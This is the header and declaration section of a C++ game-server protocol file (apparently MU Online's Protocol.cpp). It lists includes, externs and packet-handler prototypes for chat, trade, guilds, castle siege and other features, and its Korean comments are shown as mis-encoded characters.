//----------------------------------------------------------------------------
// GAME SERVER - PROTOCOL.CPP
// Ŭ���̾�Ʈ���� ������ �ְ�޴� �������� ó�� ���
//----------------------------------------------------------------------------
#include "stdafx.h"
#include <stdio.h>
#include "..\\Include\\Prodef.h"
#include "..\\Include\\SProdef.h"
#include "..\\Common\\winutil.h"
#include "..\\Include\\GMProtocol.h"
#include "..\\Include\\Public.h"
#include "..\\Include\\cb_protocol.h"
#include "User.h"
#include "Sprotocol.h"
#include "DSProtocol.h"
#include "wsGameServer.h"
#include "wsJoinServerCli.h"
#include "Gamemain.h"
#include "MapItem.h"
#include "Protocol.h"
#include "WhisperCash.h"
#include "PartyClass.h"
#include "Event.h"
#include "GMMng.h"
#include "giocp.h"
#include "Npctalk.h"
#include "GuildClass.h"
#include "MagicDamage.h"
#include "DBSockMng.h"
#include "OffExp.h"
#include "EDSProtocol.h"
#include "PShop.h"
#include "PickUpSystem.h"

#ifdef MODIFY_MIX_SYSTEM_20070518
//#include "ChaosBox.h"
#include "MixSystem.h"
#endif

#include "ConMember.h"
#include "SimpleModulus.h"
#include "BattleGround.h"
#include "BattleSoccer.h"
#include "NSerialCheck.h"

#include "DevilSquare.h"

#include "BattleSoccerManager.h"

#ifdef FOR_BLOODCASTLE
#include "BloodCastle.h"
#endif

#ifdef CHAOSCASTLE_SYSTEM_20040408
#include "ChaosCastle.h"
#endif

#ifdef CASTLE_MAIN_SCHEDULER_20041111
#include "CastleSiege.h"
#endif

#ifdef MU_CASTLESIEGE_SERVER_SYNC_20041130
#include "CastleSiegeSync.h"
#endif

#ifdef JEWEL_MIX_SYSTEM_20050309
#include "JewelMixSystem.h"
#endif

#include "math.h"

#include "Gate.h"

#ifdef NEW_SKILL_FORSKYLAND
#include "QuestInfo.h"
#endif

#ifdef __FRIEND_WORK__
#include "EDSProtocol.h"
#endif

#ifdef MULTI_CHECKSUM
#include "MultiCheckSum.h"
#endif

#include "SendHackLog.h"

#include "wsJoinServerCli.h"

#include "ObjUseSkill.h"
#include "MultiAttackHackCheck.h"
#include "PacketCheckSum.h"
#include "ObjCalCharacter.h"

#include "gObjMonster.h"

#ifdef ADD_NEW_MAP_KALIMA_20040518			// ���� ó���Լ� ��ü
#include "KalimaGate.h"
#endif

#ifdef DARKLORD_WORK
#include "DarkSpirit.h"
#endif

#ifdef ADD_NEW_UNION_01_20041006
#include "TUnion.h"
#endif

#ifdef CHINA_HACKUSER_KICK_SYSTEM
#include "ChinaHackUserKick.h"
#endif

#ifdef CASTLE_NPC_LIFESTONE_WORK_20041208
#include "LifeStone.h"
#endif
#ifdef ADD_NEW_MERCENARY_FOR_CASTLE_01_20041214
#include "Mercenary.h"
#endif
#ifdef ADD_NEW_WEAPON_FOR_CASTLE_01_20041116
#include "Guardian.h"
#endif
#ifdef ADD_NEW_WEAPON_FOR_CASTLE_01_20041116
#include "Weapon.h"
#endif

#ifdef ADD_MINUS_STAT_SYSTEM_USING_FRUIT_20050712
#include "StatMng.h"
#endif

#ifdef MU_CRYWOLF_CL_PROTOCOL_20050505
#include "Crywolf.h"
#endif

#ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
#include "JewelOfHarmonySystem.h"
#endif

#ifdef ITEM_ADD_OPTION_20061019
#include "ItemAddOption.h"
#endif // ITEM_ADD_OPTION_20061019

#include "MoveCommand.h" //happycat@20050201

#ifdef ADD_PARTIALY_CHARGE_CASH_SHOP_20070117
#include "CashShop.h"
#endif // ADD_PARTIALY_CHARGE_CASH_SHOP_20070117

#ifdef PREMIUMITEM_20090106
#include "CashShop.h"
#endif

#ifdef MODIFY_PERIOD_ITEM_SYSTEM_BUGFIX_20070326
#include "CashItemPeriodSystem.h"
#endif // MODIFY_PERIOD_ITEM_SYSTEM_BUGFIX_20070326

#ifdef ADD_PCS_LOTTERY_SYSTEM_20070117
#include "CashLotterySystem.h"
#endif // ADD_PCS_LOTTERY_SYSTEM_20070117

#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328
#include "IllusionTempleEvent.h"
#endif

//#ifdef ADD_PCS_EVENT_MAP_FREE_TICKET_20070110	����Ǿ�����(RKFKA)
//#include "KalimaGate.h"
//#endif // ADD_PCS_EVENT_MAP_FREE_TICKET_20070110

#ifdef MODIFY_BUFF_SYSTEM_EXTENTION_20070917
#include "BuffEffectSlot.h"
#endif // MODIFY_BUFF_SYSTEM_EXTENTION_20070917

#ifdef MASTER_LEVEL_SKILL_SYSTEM_20071122
#include "MasterSkillSystem.h"
#endif

#if defined(MASTER_LEVEL_UP_SYSTEM_20070912) && defined(MODIFY_MASTER_LEVEL_SYSTEM_20080414)
#include "MasterLevelSystem.h"
#endif

#ifdef ADD_NEWPVP_PKFIELD
#include "NewPVP.h"

#define ERROR_RETURN_INT(t, err_code, func) \
if(!(t)) \
{ \
	func; \
	return err_code; \
}

#define ERROR_RETURN(t, func) \
if(!(t)) \
{ \
	func; \
	return; \
}
#endif // ADD_NEWPVP_PKFIELD

#ifdef ADD_HACKING_TOOL_BLOCK_20090311
#include "HackToolBlock.h"
#endif // ADD_HACKING_TOOL_BLOCK_20090311

#ifdef ADD_MAPMOVE_PROTOCOL_20090327
#include "KeyGenerater.h"
#endif // ADD_MAPMOVE_PROTOCOL_20090327

#ifdef ADD_MAPMOVE_PROTOCOL_20090327
#include "Raklion.h"
#endif // ADD_MAPMOVE_PROTOCOL_20090327

//----------------------------------------------------------------------------
// E X T E R N
//----------------------------------------------------------------------------
extern CwsGameServer	wsGServer;
extern wsJoinServerCli  wsJServerCli;
extern wsJoinServerCli  wsDataCli;

extern CWhisperCash	WhisperCash;
extern PartyClass		gParty;
extern CGuildClass		Guild;
extern CMagicDamage	MagicDamageC;

extern char gStalkProtocolId[];
extern BOOL gStalkProtocol;

extern CSimpleModulus g_SimpleModulusCS;
extern CSimpleModulus g_SimpleModulusSC;


extern CBattleSoccer*  gBSGround[];
extern NSerialCheck	gNSerialCheck[];


#ifdef PERSONAL_SHOP_20040113
extern ITEM_ATTRIBUTE      ItemAttribute [MAX_ITEM];
#endif


extern wsJoinServerCli		wsRServerCli;			//  ��ŷ����


int tempindex;


#ifdef MU_CHN_THANKS_COOKIE_EVENT_20040908
#include "ItemBagEx.h"
extern CItemBagEx *	ChnThanksCookieEvent;			// �߱� ���� �̺�Ʈ
#endif

#ifdef ADD_SHIELD_POINT_01_20060403
extern void gObjCalcShieldPoint(LPOBJECTSTRUCT lpObj);
#endif

extern BOOL gObjMonsterRegen(LPOBJECTSTRUCT lpObj);
//----------------------------------------------------------------------------
// F U N C T I O N
//----------------------------------------------------------------------------

void MsgSendV2(LPOBJECTSTRUCT lpObj, LPBYTE Msg, int size);

void PChatProc(LPPMSG_CHATDATA lpChat, short aIndex);
void CGChatRecv(LPPMSG_CHATDATA_NUMBER lpMsg, int aIndex);
void CGChatWhisperRecv(LPPMSG_CHATDATA_WHISPER lpMsg, int aIndex);
void CGLiveClient(LPPMSG_CLIENTTIME lpClientTime, short aIndex);
void CGCheckMainRecv(LPPMSG_CHECK_MAINEXE_RESULT lpMsg, int aIndex);


// ���� ���� 0 : �ϴ�, 1:���� 
void GCServerMsgStringSend(char *szMsg, int aIndex, BYTE type);


void CGClientMsg(LPPMSG_CLIENTMSG lpMsg, int aIndex);
void PEchoProc(BYTE *aMsg, int aLen, short aIndex);
void PMoveProc(LPPMSG_MOVE lpMove, int aIndex);
void CGAttack(LPPMSG_ATTACK lpMsg, int aIndex);
void CGActionRecv(LPPMSG_ACTION lpMsg, int aIndex);
void CSPJoinIdPassRequest(LPPMSG_IDPASS lpMsg, int aIndex);
void CGPCharacterCreate(LPPMSG_CHARCREATE lpMsg, int aIndex);
void CGPCharDel(LPPMSG_CHARDELETE lpMsg, int aIndex);
//void CSPCreateAccountRequest(LPPMSG_ACCOUNTREQUEST lpMsg, short aIndex);
void CGPCharacterMapJoinRequest(LPPMSG_CHARMAPJOIN lpMsg, int aIndex);
void CGMonsterJoin(LPPMSG_MONSTERJOIN lpMsg, short aIndex);
void CGItemGetRequest(LPPMSG_ITEMGETREQUEST lpMsg, int aIndex);
void CGInventoryItemMove(LPPMSG_INVENTORYITEMMOVE lpMsg, int aIndex);
void CGTalkRequestRecv(LPPMSG_TALKREQUEST lpMsg, int aIndex);
void CGBuyRequestRecv(LPPMSG_BUYREQUEST lpMsg, int aIndex);
void CGSellRequestRecv(LPPMSG_SELLREQUEST lpMsg, int aIndex);
void CGModifyRequestItem(LPPMSG_ITEMDURREPAIR lpMsg, int aIndex);
void CGUseItemRecv(LPPMSG_USEITEM lpMsg, int aIndex);
void CGLevelUpPointAdd(LPPMSG_LVPOINTADD lpMsg, int aIndex);
void CGTeleportRecv(LPPMSG_TELEPORT lpMsg, int aIndex);
void CGPosMagicAttackRecv(LPPMSG_POSMAGIC lpMsg, int aIndex);
void GCInventoryItemDeleteSend(int aInex, BYTE pos, BYTE flag);
void CGDurationMagicRecv(LPPMSG_DURATION_MAGIC_RECV lpMsg, int aIndex);
void CSPPasswordQuestionQuery(LPPMSG_PASSQUESTION_QUERY lpMsg, int aIndex);
void CSPPasswordQuery(LPPMSG_PASSQUERY lpMsg, int aIndex);
void CSPPasswordChange(LPPMSG_PASSCHANGE lpMsg, int aIndex);
void CGPartyList(int aIndex);
void CGPartyListAll(int pnumber);
void CGPartyRequestResultRecv(LPPMSG_PARTYREQUESTRESULT lpMsg, int aIndex);
void CGPartyDelUser(LPPMSG_PARTYDELUSER lpMsg, int aIndex);


#ifdef PERSONAL_SHOP_20040113
VOID CGPShopReqSetItemPrice (LPPMSG_REQ_PSHOP_SETITEMPRICE lpMsg, int aIndex);
VOID CGPShopAnsSetItemPrice (int aIndex, BYTE btResult, BYTE btItemPos);
VOID CGPShopReqOpen (LPPMSG_REQ_PSHOP_OPEN lpMsg, int aIndex);
VOID CGPShopAnsOpen (int aIndex, BYTE btResult);
VOID CGPShopReqClose (int aIndex);
VOID CGPShopAnsClose (int aIndex, BYTE btResult);
VOID CGPShopReqBuyList (LPPMSG_REQ_BUYLIST_FROM_PSHOP lpMsg, int aSourceIndex);
VOID CGPShopAnsBuyList (int aSourceIndex, int aTargetIndex, BYTE btResult, bool bResend = false);
VOID CGPShopReqBuyItem (LPPMSG_REQ_BUYITEM_FROM_PSHOP lpMsg, int aSourceIndex);
VOID CGPShopAnsBuyItem (int aSourceIndex, int aTargetIndex, int iItemPos, BYTE btResult);		// A�� B�� �������� ���.
VOID CGPShopAnsSoldItem (int aSourceIndex, int aTargetIndex, int iItemPos);						// A�� B���� �������� �ȾҴ�.
VOID CGPShopReqCloseDeal (LPPMSG_REQ_PSHOPDEAL_CLOSE lpMsg, int aIndex);						// A�� �ٸ� ����� ���λ��� â�� �����ִ� �ݾҴ�.
VOID CGPShopAnsDealerClosedShop (int aSourceIndex, int aTargetIndex);							// ���� ���λ����� ���� �ִ� ����� ������ �ݾҴ�.
#endif


void CGGuildRequestRecv(LPPMSG_GUILDJOINQ lpMsg, int aIndex);
void CGGuildRequestResultRecv(LPPMSG_GUILDQRESULT lpMsg, int aIndex);
void CGGuildMasterAnswerRecv(LPPMSG_GUILDMASTERANSWER lpMsg, int aIndex);
void CGGuildListAll(int pnumber);
void GCGuildDelUserSend(int aIndex);
void CGGuildMasterInfoSave(int aIndex, LPPMSG_GUILDINFOSAVE lpMsg);
void GCGuildMasterManagerRun(int aIndex);
void CGGuildDelUser(LPPMSG_GUILDDELUSER lpMsg, int aIndex);
void CGGuildMasterCreateCancel(int aIndex);
void GCGuildWarRequestSend(char *GuildName, int aIndex);
void GCGuildWarRequestSendRecv(LPPMSG_GUILDWARSEND_RESULT lpMsg, int aIndex);
void GCGuildWarScore(int aIndex);

//void CGShellExecution(BYTE *aRecv, int aIndex);

void GCPartyDelUserSend(int aIndex);
void CGTradeRequestSend(LPPMSG_TRADE_REQUEST lpMsg, int aIndex);
BOOL GCTradeResponseSend(BYTE response, int aIndex, char* id, WORD level = 0, int GuildNumber = 0);
void CGTradeMoneyRecv(LPPMSG_TRADE_GOLD lpMsg, int aIndex);
void CGTradeResponseRecv(LPPMSG_TRADE_RESPONSE lpMsg, int aIndex);
BOOL GCTradeMoneyOther(int aIndex, DWORD money);

BOOL GCTradeOkButtonSend(int aIndex, BYTE flag);
void CGTradeOkButtonRecv(LPPMSG_TRADE_OKBUTTON lpMsg, int aIndex);
void GCJoinResult(BYTE result, int aIndex);


void CGClientCloseMsg(LPPMSG_CLIENTCLOSE lpMsg, int aIndex);


void GCUserWarehouseSend(LPOBJECTSTRUCT lpObj);
void CGWarehouseMoneyInOut(int aIndex, LPPMSG_WAREHOUSEMONEYINOUT lpMsg);
void GCWarehouseInventoryMoneySend(int aIndex, BYTE result, int money, int wmoney);

#ifdef 	CHAOS_MIX_UPGRADE
void CGChaosBoxItemMixButtonClick(LPPMSG_CHAOSMIX lpMsg, int aIndex);
#else
void CGChaosBoxItemMixButtonClick(int aIndex);
#endif

void CGChaosBoxUseEnd(int aIndex);

void GCSkillKeyRecv(LPPMSG_SKILLKEY lpMsg, int aIndex);

void GCRegEventChipRecv(LPPMSG_REGEVENTCHIP lpMsg, int aIndex);
void GCGetMutoNumRecv(LPPMSG_GETMUTONUMBER lpMsg, int aIndex);
void GCUseEndEventChipRescv( int aIndex);
void GCUseRenaChangeZenRecv( LPPMSG_EXCHANGE_EVENTCHIP lpMsg, int aIndex);

// �Ǹ��� �������� �̵� ��û
void GCReqmoveDevilSquare(LPPMSG_REQ_MOVEDEVILSQUARE lpMsg, int aIndex);
void GCReqDevilSquareRemainTime(LPPMSG_REQ_DEVILSQUARE_REMAINTIME lpMsg, int aIndex);

extern void gSetBattleTeamMaster(int ground, int team, char * szname, LPGUILD_INFO lpGuild);
extern void gObjChaosItemSet(int aIndex, int itempos, BYTE set_byte);
extern BYTE gObjChaosBoxInsertItemPos(int aIndex, CItem item, int pos, int source);

extern void GCWarehouseRecivePassword(int aIndex, LPPMSG_WAREHOUSEPASSSEND lpMsg);

// Ping �� ���� ���
void GCPingSendRecv(LPPMSG_PING_RESULT aRecv, int aIndex);

// Packet Checksum
void GCPacketCheckSumRecv(LPPMSG_PACKETCHECKSUM aRecv, int aIndex);

// ����Ʈ
#ifdef NEW_SKILL_FORSKYLAND
void CGRequestQuestInfo(int aIndex);
void GCSendQuestInfo(int aIndex, int QuestIndex);
void CGSetQuestState(LPPMSG_SETQUEST lpMsg, int aIndex);
#endif

#ifdef FOR_BLOODCASTLE
void CGRequestEnterBloodCastle(LPPMSG_REQ_MOVEBLOODCASTLE lpMsg, int aIndex);
#endif

#ifdef CHAOSCASTLE_SYSTEM_20040408
// [0xAF][0x01] ����ڰ� ī���� ĳ���� ���� ��û�� �Ѵ�.
void CGRequestEnterChaosCastle(LPPMSG_REQ_MOVECHAOSCASTLE lpMsg, int aIndex);
// [0xAF][0x02] Ŭ���̾�Ʈ�� ����ڰ� �̻��� ��ġ�� ������ �˸���.
void CGRequestRepositionUserInChaosCastle(LPPMSG_REQ_REPOSUSER_IN_CC lpMsg, int aIndex);
#endif

#ifdef BLOODCASTLE_EVENT_3RD_20040401
// [0x0B] ���� ĳ���� ���� �Ϸ� ����Ƚ���� ��ŷ������ ��û�Ѵ�.
extern void EGReqBloodCastleEnterCount(INT iIndex);
// [0x9F] ���� ĳ���� ���� ����Ƚ���� ����ڰ� ��û�� ��
void CGRequestEventEnterCount(LPPMSG_REQ_CL_ENTERCOUNT lpMsg, int aIndex);
#endif

#ifdef EVENT_LOTTO
void CGRequestLottoRegister(LPPMSG_REQ_2ANV_LOTTO_EVENT lpMsg, int aIndex);
#endif

#ifdef MAP_SERVER_WORK_20041030
void CGReqMoveOtherServer(LPPMSG_REQ_MOVE_OTHERSERVER lpMsg, int aIndex);
#endif

void CGTargetTeleportRecv(LPPMSG_TARGET_TELEPORT lpMsg, int aIndex);


#if defined NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_10_20050411 || defined NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_20_20050411
void GCNPggCheckSumRecv(LPPMSG_NPROTECTGGCHECKSUM lpMsg, int aIndex);
#endif

#ifdef NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_25_20060123
void GCNPggCheckSumRecv(LPPMSG_NPROTECTGGCHECKSUM lpMsg, int aIndex);
#endif

#ifdef DARKLORD_WORK
void CGRequestPetItemCommand(LPPMSG_REQUEST_PET_ITEM_COMMAND lpMsg, int aIndex);
void CGRequestPetItemInfo(LPPMSG_REQUEST_PET_ITEMINFO lpMsg, int aIndex);
#endif

#ifdef DUEL_SYSTEM_20031028
#ifdef ADD_NEWPVP_PKFIELD
int	OnCGInviteDuel(LPPMSG_REQ_DUEL_INVITE lpMsg, int aIndex);
int OnCGAnswerDuel(LPPMSG_ANS_DUEL_ANSWER lpMsg, int aIndex);
int OnCGExitDuel(LPPMSG_ANS_DUEL_LEAVE lpMsg, int aIndex);

int OnDuelChannelJoin(LPPMSG_REQ_DUEL_JOINCNANNEL lpMsg, int aIndex);
int OnDuelChannelLeave(LPPMSG_REQ_DUEL_LEAVECNANNEL lpMsg, int aIndex);
#else
// [0xAA] ���������� ��û�ߴ�.
void CGDuelStartRequestRecv(LPPMSG_REQ_START_DUEL lpMsg, int aIndex);
// [0xAB] �������Ḧ ��û�ߴ�.
void CGDuelEndRequestRecv(LPPMSG_REQ_END_DUEL lpMsg, int aIndex);
// [0xAC] ������û�� ���� Ȯ�ο��θ� �����Դ�.
void CGDuelOkRequestRecv(LPPMSG_ANS_DUEL_OK lpMsg, int aIndex);
// [0xAD] ���� ������ �������� ������
void GCSendDuelScore (int aIndex1, int aIndex2);
#endif // ADD_NEWPVP_PKFIELD
#endif

#ifdef EXPERIENCE_SERVER_NPC_STAT_RESET
// [0xF2] �����ʱ�ȭ ��ư ������.
void StatResetBtnClick( LPPMSG_REQ_STAT_RESET lpMsg, int iIndex );
#endif // EXPERIENCE_SERVER_NPC_STAT_RESET


#ifdef MAP_SERVER_WORK_20041030		// ���� �ʺ��� ���� ��Ŷ - ���Ӽ��� <-> Ŭ���̾�Ʈ
//----------------------------------------------------------------------------
// CG [0xB1][0x01] �ʼ��� �̵� �� �߰����� ����, ���ӿ�û (0xC3)
//----------------------------------------------------------------------------
void CGReqMapSvrAuth			(LPPMSG_REQ_MAPSERVERAUTH lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB1][0x01] �ʼ��� �̵� �� �߰����� ����, ���ӿ�û ��� (0xC1)
//----------------------------------------------------------------------------
void GCAnsMapSvrAuth			(INT iIndex, INT iResult);
#endif


#ifdef MU_CASTLESIEGE_CL_PROTOCOL_20041122	// �� ������ - �� Ŭ���̾�Ʈ ���� �������� �Լ� ����
//----------------------------------------------------------------------------
// CG [0xB2][0x00] Ŭ���̾�Ʈ�� ������ ���������� ��û
//----------------------------------------------------------------------------
void CGReqCastleSiegeState		(LPPMSG_REQ_CASTLESIEGESTATE lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x00] Ŭ���̾�Ʈ�� ������ ���������� ��û ����
//----------------------------------------------------------------------------
void GCAnsCastleSiegeState		(INT iIndex, INT iResult, LPSTR lpszGuildName,  LPSTR lpszGuildMaster);
//----------------------------------------------------------------------------
// CG [0xB2][0x01] ������ ����� ��û
//----------------------------------------------------------------------------
void CGReqRegCastleSiege		(LPPMSG_REQ_REGCASTLESIEGE lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x01] ������ ����� ��û ����
//----------------------------------------------------------------------------
void GCAnsRegCastleSiege		(INT iIndex, INT iResult, LPSTR lpszGuildName);
//----------------------------------------------------------------------------
// CG [0xB2][0x02] ������ ���⸦ ��û
//----------------------------------------------------------------------------
void CGReqGiveUpCastleSiege		(LPPMSG_REQ_GIVEUPCASTLESIEGE lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x02] ������ ���⸦ ��û ����
//----------------------------------------------------------------------------
void GCAnsGiveUpCastleSiege		(INT iIndex, INT iResult, BOOL bGiveUp, INT iMarkCount, LPSTR lpszGuildName);
//----------------------------------------------------------------------------
// CG [0xB2][0x03] �ڽ��� ����� ������Ͽ� ���� ������ ��û
//----------------------------------------------------------------------------
void CGReqGuildRegInfo			(LPPMSG_REQ_GUILDREGINFO lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x03] �ڽ��� ����� ������Ͽ� ���� ������ ��û ����
//----------------------------------------------------------------------------
void GCAnsGuildRegInfo			(INT iIndex, INT iResult, LPCSP_ANS_GUILDREGINFO lpMsgResult);
//----------------------------------------------------------------------------
// CG [0xB2][0x04] �ڽ��� ����� ������ ǥ�� ��� ��û
//----------------------------------------------------------------------------
void CGReqRegGuildMark			(LPPMSG_REQ_REGGUILDMARK lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x04] �ڽ��� ����� ������ ǥ�� ��� ��û ����
//----------------------------------------------------------------------------
void GCAnsRegGuildMark			(INT iIndex, INT iResult, LPCSP_ANS_GUILDREGMARK lpMsgResult);
//----------------------------------------------------------------------------
// CG [0xB2][0x05] ������ NPC ���� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqNpcBuy				(LPPMSG_REQ_NPCBUY lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x05] ������ NPC ���� ��û ����
//----------------------------------------------------------------------------
void GCAnsNpcBuy				(INT iIndex, INT iResult, INT iNpcNumber, INT iNpcIndex);
//----------------------------------------------------------------------------
// CG [0xB2][0x06] ������ NPC ���� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqNpcRepair				(LPPMSG_REQ_NPCREPAIR lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x06] ������ NPC ���� ��û ����
//----------------------------------------------------------------------------
void GCAnsNpcRepair				(INT iIndex, INT iResult, INT iNpcNumber, INT iNpcIndex, INT iNpcHP, INT iNpcMaxHP);
//----------------------------------------------------------------------------
// CG [0xB2][0x07] ������ NPC ���׷��̵� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqNpcUpgrade			(LPPMSG_REQ_NPCUPGRADE lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x07] ������ NPC ���׷��̵� ��û ����
//----------------------------------------------------------------------------
void GCAnsNpcUpgrade			(INT iIndex, INT iResult, INT iNpcNumber, INT iNpcIndex, INT iNpcUpType, INT iNpcUpValue);
//----------------------------------------------------------------------------
// CG [0xB2][0x08] ���� ���� �ڱ�, ���� ���� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqTaxMoneyInfo			(LPPMSG_REQ_TAXMONEYINFO lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x08] ���� ���� �ڱ�, ���� ���� ��û ����
//----------------------------------------------------------------------------
void GCAnsTaxMoneyInfo			(INT iIndex, INT iResult, BYTE btTaxRateChaos, BYTE btTaxRateStore, INT64 i64Money);
//----------------------------------------------------------------------------
// CG [0xB2][0x09] ���� ���� ���� ���� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqTaxRateChange			(LPPMSG_REQ_TAXRATECHANGE lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x09] ���� ���� ���� ���� ��û ����
//----------------------------------------------------------------------------
void GCAnsTaxRateChange			(INT iIndex, INT iResult, BYTE btTaxType, INT iTaxRate);
//----------------------------------------------------------------------------
// CG [0xB2][0x10] ���� ���� �ڱ� ��� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqMoneyDrawOut			(LPPMSG_REQ_MONEYDRAWOUT lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x10] ���� ���� �ڱ� ��� ��û ����
//----------------------------------------------------------------------------
void GCAnsMoneyDrawOut			(INT iIndex, INT iResult, INT64 i64Money);
//----------------------------------------------------------------------------
// GC [0xB2][0x11] ���� ������ ����� �������� ��û ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsGateState			(INT iIndex, INT iResult, INT iGateIndex);
//----------------------------------------------------------------------------
// CG [0xB2][0x12] Ư�� ������ ���� ������� ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqCsGateOperate			(LPPMSG_REQ_CSGATEOPERATE lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x12] Ư�� ������ ���� ������� ��û ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsGateOperate			(INT iIndex, INT iResult, INT iGateIndex, INT iGateOperate);
//----------------------------------------------------------------------------
// GC [0xB2][0x13] Ư�� ������ ���� ���������� ������ (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsGateCurState		(INT iIndex, INT iGateIndex, INT iGateOperate);
//----------------------------------------------------------------------------
// GC [0xB2][0x14] Ư�� ������� �հ� ����ġ �۵����θ� �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsAccessSwitchState	(INT iIndex, INT iSwitchIndex, INT iSwitchUserIndex, BYTE btSwitchState);
//----------------------------------------------------------------------------
// GC [0xB2][0x15] Ư�� ������� �հ� ���ε�� ���θ� �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsAccessCrownState	(INT iIndex, BYTE btCrownState);
//----------------------------------------------------------------------------
// GC [0xB2][0x17] ���� ������ ���� ���θ� �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsNotifyStart			(INT iIndex, BYTE btStartState);
//----------------------------------------------------------------------------
// GC [0xB2][0x18] ���� ������ ���� ���¸� �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsNotifyProgress		(INT iIndex, BYTE btCastleSiegeState, LPSTR lpszGuildName);
//----------------------------------------------------------------------------
// GC [0xB2][0x1A] ���� �ʼ������� ����� ������ �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsMapSvrTaxInfo		(INT iIndex, BYTE btTaxType, BYTE btTaxRate);
//----------------------------------------------------------------------------
// CG [0xB2][0x1B] �̴ϸ� �����͸� �ֱ������� ������ ���� ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqCsMiniMapData			(LPPMSG_REQ_MINIMAPDATA lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x1B] �̴ϸ� �����͸� �ֱ������� ������ ���� ��û ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsMiniMapData			(INT iIndex, BYTE btResult);
//----------------------------------------------------------------------------
// CG [0xB2][0x1C] �̴ϸ� �����͸� ���̻� ������ ����� �˸� (0xC1)
//----------------------------------------------------------------------------
void CGReqStopCsMiniMapData		(LPPMSG_REQ_STOPMINIMAPDATA lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// CG [0xB2][0x1D] ������ ������� �渶�� ����鿡�� ���� ���� (0xC1)
//----------------------------------------------------------------------------
void CGReqCsSendCommand			(LPPMSG_REQ_CSCOMMAND lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x1D] ������ ������� �渶�� ����鿡�� ���� ���� ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsSendCommand			(INT iCsJoinSide, BYTE btTeam, BYTE btX, BYTE btY, BYTE btCommand);
//----------------------------------------------------------------------------
// GC [0xB2][0x1E] ������ �� ���� �ð��� ����ڵ鿡�� �ֱ������� �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsLeftTimeAlarm		(BYTE btHour, BYTE btMinute);
//----------------------------------------------------------------------------
// GC [0xB2][0x1E] ������ �� ���� �ð��� �Ѹ��� ����ڿ��� �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsSelfCsLeftTimeAlarm	(INT iIndex, BYTE btHour, BYTE btMinute);
//----------------------------------------------------------------------------
// CG [0xB2][0x1F] �� ����� ���� ���ɿ��� ���� ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqCsSetEnterHuntZone	(LPPMSG_REQ_CSHUNTZONEENTER lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xB2][0x1F] �� ����� ���� ���ɿ��� ���� ��û ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsSetEnterHuntZone	(INT iIndex, BYTE btResult, BYTE btEnterHuntZone);
//----------------------------------------------------------------------------
// CG [0xB3] �������� DB�� �����Ǵ� Ư�� NPC�� ����� ��û -> ����üũ, �������� ���� (0xC1)
//----------------------------------------------------------------------------
void CGReqNpcDbList				(LPPMSG_REQ_NPCDBLIST lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// CG [0xB4] ���� ��� ����� ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqCsRegGuildList		(LPPMSG_REQ_CSREGGUILDLIST lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// CG [0xB5] ���� ���� ����� ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqCsAttkGuildList		(LPPMSG_REQ_CSATTKGUILDLIST lpMsg, INT iIndex);
#endif

#ifdef JEWEL_MIX_SYSTEM_20050309			// �������� �ý��� �߰���Ŷ
//----------------------------------------------------------------------------
// CG [0xBC][0x00] �������� ���� ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqJewelMix				(LPPMSG_REQ_JEWEL_MIX lpMsg, INT iIndex);
//----------------------------------------------------------------------------
// GC [0xBC][0x00] �������� ���� ��û ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsJewelMix				(INT iIndex, INT iResult);
//----------------------------------------------------------------------------
// CG [0xBC][0x01] �������� ��ü ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqJewelUnMix			(LPPMSG_REQ_JEWEL_UNMIX lpMsg, INT iIndex);
//----------------------------------------------------------------------------
